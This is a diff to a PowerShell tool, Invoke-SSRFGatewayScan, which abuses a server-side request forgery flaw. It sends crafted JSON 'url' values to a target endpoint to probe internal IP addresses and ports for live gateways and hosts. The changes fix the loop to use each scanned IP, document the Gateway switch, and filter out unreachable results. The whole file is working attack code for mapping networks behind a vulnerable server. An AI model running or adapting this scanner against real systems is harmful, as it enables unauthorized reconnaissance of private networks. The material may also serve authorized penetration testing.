@@ -15,8 +15,10 @@
   A filepath to a list a hostnames to bruteforce. This parameter cannot be used with NetworkAddress.
 .PARAMETER Timeout
   Number of seconds before moving onto the next address.
+.PARAMETER Gateway
+  Enumerate Gateways in a CIDR IPv4 address range.
 .PARAMETER Open
-  Will show alive/valid gateways/hosts. Setting this to false will show everything.
+  Will show alive/valid gateways/hosts. Setting this to false will show everything. Has no effect when used with Gateway.
 .OUTPUTS
   Returns PSCustomObject with the corresponding port and response object
 .NOTES
@@ -36,7 +38,7 @@ function Invoke-SSRFGatewayScan() {
   # Network Address Parameter set
   [Parameter(Mandatory=$True, ParameterSetName="NetworkAddress", HelpMessage='A valid network address in CIDR format to generate gateways from.. This parameter cannot be used with Hosts')]
   [string]$NetworkAddress,
-  [Parameter(Mandatory=$false, ParameterSetName="NetworkAddress", HelpMessage='Enumerate Gateways')]
+  [Parameter(Mandatory=$false, ParameterSetName="NetworkAddress", HelpMessage='Enumerate Gateways in a CIDR IPv4 address range.')]
   [switch]$Gateway,
   [Parameter(Mandatory=$false, ParameterSetName="NetworkAddress", HelpMessage='Enumerate Live Hosts within a Subnet')]
   [switch]$Hosts,
@@ -91,11 +93,17 @@ function Invoke-SSRFGatewayScan() {
       foreach ($ip in $ips) {
         foreach($p in $Ports) {
           try {
-            $json = @{"url" = "http://"+ $g + ":" + $p} | ConvertTo-Json
+            $json = @{"url" = "http://"+ $ip + ":" + $p} | ConvertTo-Json
             $res = Invoke-WebRequest -uri $target -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -TimeoutSec $Timeout
             $res | Add-Member -NotePropertyName IP -NotePropertyValue $ip
             $res | Add-Member -NotePropertyName Port -NotePropertyValue $p
-            Write-Output $res | Select-Object -property IP, Port, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
+            if($Open) {
+              if($res.Content -notlike '*EHOSTUNREACH*') # dns lookup failure
+              { Write-Output $res | Select-Object -property IP, Port, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength }
+            }
+            else {
+              Write-Output $res | Select-Object -property IP, Port, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
+            }
           }
           catch {
             foreach ($e in $Error) {
